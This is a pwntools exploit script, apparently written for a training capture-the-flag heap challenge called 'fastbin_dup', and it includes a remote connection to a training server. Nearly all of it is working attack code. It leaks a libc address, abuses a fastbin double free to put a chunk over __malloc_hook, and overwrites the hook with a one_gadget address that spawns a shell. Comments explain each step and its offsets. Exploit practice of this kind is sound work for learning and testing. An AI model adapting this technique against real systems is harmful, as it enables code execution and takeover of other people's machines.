from pwn import *

# A menu asks what to do: allocate a new chunk, write, read or free one.
# Here we can exploit the fact that the program does not check for a block to be freed twice.

CHALL_PATH = "./fastbin_dup_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("/home/merk/odc/env/libc-2.23.so")
COMMANDS = """
b  main
c
"""

def alloc(c, size) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode("utf-8"))
    line = c.recvline()
    index = int(line.split(b"index ")[1].split(b"!\n")[0])
    return index
    
def write(c, index, data) :
    c.recvuntil(b"> ")
    c.sendline(b'2')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    c.recvuntil(b"Content: ")
    c.send(data)    # here we are working with pointers, so sending a newline would break execution because '\n' would be saved instead of a valid address

def read(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'3')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    return c.recvline()

def free(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))

if args.REMOTE:
    c = remote("fastbin-dup.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

alloc(c, 0x100) # Index 0
alloc(c, 0x30)  # Index 1
free(c, 0)

leak = read(c, 0)[:6]
leak = leak.ljust(8, b"\x00")
leak = u64(leak)
# LIBC.address = leak - LIBC.symbols["main_arena"] + 88 no because libc has no symbol called  main arena (we only have it in gdb because we downloaded it from a debug symbol repo)
LIBC.address = leak - 0x3c4b78  # hex(0x000077ee64fc4b78 - 0x77ee64c00000) manually done in python [leaked address - libc base address got with vmmap]
print("LIBC leak: ", hex(LIBC.address))

alloc(c, 0x60)  # Index 2
alloc(c, 0x60)  # Index 3

free(c, 2)
free(c, 3)  # by placing this between, the program does not exit
free(c, 2)  # so now we can free the chunk with index 2 twice without being caught

# These instructions are useless in this case, but they may be useful in the future
# heap_leak = read(c, 0)
# print(f"Heap leak: {heap_leak}")    # It may be necessary to restart the exploit some times because with ASLR some bytes of the pointer may be 0 => puts (the function used in this prog to print information) stops printing the address before finishing

index = alloc(c, 0x60)  # Index 4
write(c, 4, p64(LIBC.address + 0x3c4aed))   # hex(0x7ed9ac5c4aed - 0x7ed9ac200000) [addr above __malloc_hook chunk - libc base address (different from the value used before because this is another execution)]

# allocating fastbins to "flush" the linked list and make the pointer around __malloc_hook be the first in the list
alloc(c, 0x60)  # Index 5
alloc(c, 0x60)  # Index 6
alloc(c, 0x60)  # Index 7, allocated around the __malloc_hook

# Trying all the libc-2.23.so gadgets got with one_gadget
# write(c, 7, b"A"*19 + p64(LIBC.address + 0x4527a))    # 0x4527a is the offset of a gadget inside libc-2.23.so which spawns a shell (we got it with one_gadget) but it doesn't work
write(c, 7, b"A"*19 + p64(LIBC.address + 0xf1247))

c.interactive()
# Then you have to alloc one new chunk of some size (we used 20) and the malloc hook is called with the gadget for spawning a shell, so you have complete control